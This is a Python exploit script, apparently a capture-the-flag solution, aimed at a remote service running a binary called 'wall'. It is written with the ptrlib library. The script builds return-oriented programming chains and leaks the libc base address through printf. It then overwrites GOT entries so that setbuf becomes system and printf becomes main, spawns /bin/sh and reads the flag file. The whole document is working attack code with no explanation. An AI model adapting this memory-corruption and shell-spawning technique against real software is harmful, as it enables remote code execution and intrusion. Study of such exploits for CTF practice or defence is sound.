from ptrlib import *
import os
libc = ELF("./libc.so.6")
elf = ELF("./wall")

while True:
    sock = Socket('34.170.146.252', 51685)
    rop  = p64(next(elf.gadget("pop rbp; ret;")))
    rop += p64(elf.got("setbuf") + 0x80)
    rop += p64(0x401196)
    payload  = p64(next(elf.gadget("ret"))) * ((4096 - len(rop)) // 8)
    payload += rop
    assert b"\n" not in payload
    sock.sendlineafter(": ", payload)
    rop  = p64(next(elf.gadget("pop rbp; ret;")))
    rop += p64(elf.got("printf") + 0x80)
    rop += p64(0x4011b1)
    payload  = p64(next(elf.gadget("ret"))) * ((0x80 - len(rop)) // 8)
    payload += rop
    assert b"\n" not in payload
    sock.sendlineafter("? ", payload)
    sock.recvline()
    try:
        r = sock.recvregex("from (.+): \"", timeout=0.5)
    except (TimeoutError, ConnectionResetError):
        logger.warning("Bad luck!")
        continue
    libc.base = u64(r[0]) - libc.symbol("printf")
    payload  = p64(libc.symbol("system")) # setbuf@got -> system
    payload += p64(elf.symbol("main")) # printf@got -> main
    payload += p64(0) * 6
    payload += p64(libc.symbol("_IO_2_1_stdout_")) + p64(0)
    payload += p64(libc.symbol("_IO_2_1_stdin_")) + p64(0)
    payload += p64(next(libc.find("/bin/sh")))
    assert b"\n" not in payload
    sock.sendline(payload)
    sock.sendline("cat /flag*")
    sock.sh()
    break
